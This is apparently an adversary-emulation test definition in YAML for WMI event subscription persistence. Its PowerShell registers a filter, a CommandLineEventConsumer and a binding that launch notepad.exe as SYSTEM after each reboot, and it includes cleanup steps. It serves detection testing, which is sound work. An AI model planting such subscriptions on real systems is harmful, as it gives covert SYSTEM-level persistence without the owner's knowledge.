api_version: "2.0"
name: Persistence via WMI Event Subscription - CommandLineEventConsumer
description: |
    Run from an administrator powershell window. After running, reboot the victim machine.
    After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

    Code references

    https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af

    https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545
uuid: 3c64f177-28e2-49eb-a799-d767b24dd1e0
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.003: Windows Management Instrumentation Event Subscription'
requirements:
    platforms:
        - os: windows
steps:
    - name: persistence-via-wmi-event-subscription---commandlineeventconsumer
      inline: |
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                        EventNameSpace='root\CimV2';
                        QueryLanguage="WQL";
                        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                        CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
        $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

        $FilterToConsumerArgs = @{
        Filter = [Ref] $Filter;
        Consumer = [Ref] $Consumer;
        }
        $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
      executor: powershell
      cleanup:
        inline: |
            $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
            $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
            $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
            $FilterConsumerBindingToCleanup | Remove-WmiObject
            $EventConsumerToCleanup | Remove-WmiObject
            $EventFilterToCleanup | Remove-WmiObject
        executor: powershell
